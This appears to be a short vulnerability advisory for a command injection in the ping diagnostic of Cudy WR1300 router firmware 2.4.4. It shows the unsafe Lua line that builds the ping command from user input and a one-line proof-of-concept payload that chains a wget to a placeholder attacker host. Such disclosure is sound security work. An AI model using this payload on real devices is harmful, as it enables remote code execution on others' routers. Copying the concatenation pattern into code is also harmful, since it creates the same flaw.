# Cudy WR1300 2.4.4 - Command Injection via Ping (RCE)

## Overview

A critical Command Injection vulnerability was identified in the firmware of the **Cudy WR1300 router**, version **2.4.4 (Build 2025-05-07)**.  
The issue affects the diagnostic **ping functionality** implemented through the LuCI web interface.

## Affected Component

- `/usr/lib/lua/luci/model/cbi/tools/ping.lua`

## Impact

An attacker can inject arbitrary system commands through the ping parameter, leading to Remote Code Execution (RCE) on the device.

## Vulnerability Details

The vulnerability is caused by unsafe handling of user input, which is directly concatenated into system commands using:

```lua
luci.util.exec("ping -c 4 -W 1 " .. user_input)
````

Proof of Concept (PoC)

```bash
127.0.0.1; wget http://ATTACKER_IP:7777/poc
```

<img width="1098" height="301" alt="2026-04-08 00_32_00-havook e mais uma guia - Explorador de Arquivos" src="https://github.com/user-attachments/assets/45531167-66ac-4e06-9d51-1c5d6eae30e3" />


<img width="1080" height="126" alt="2026-04-08 00_34_17-havook e mais uma guia - Explorador de Arquivos" src="https://github.com/user-attachments/assets/4048048c-3775-4c49-a1b1-dff66a3929a4" />

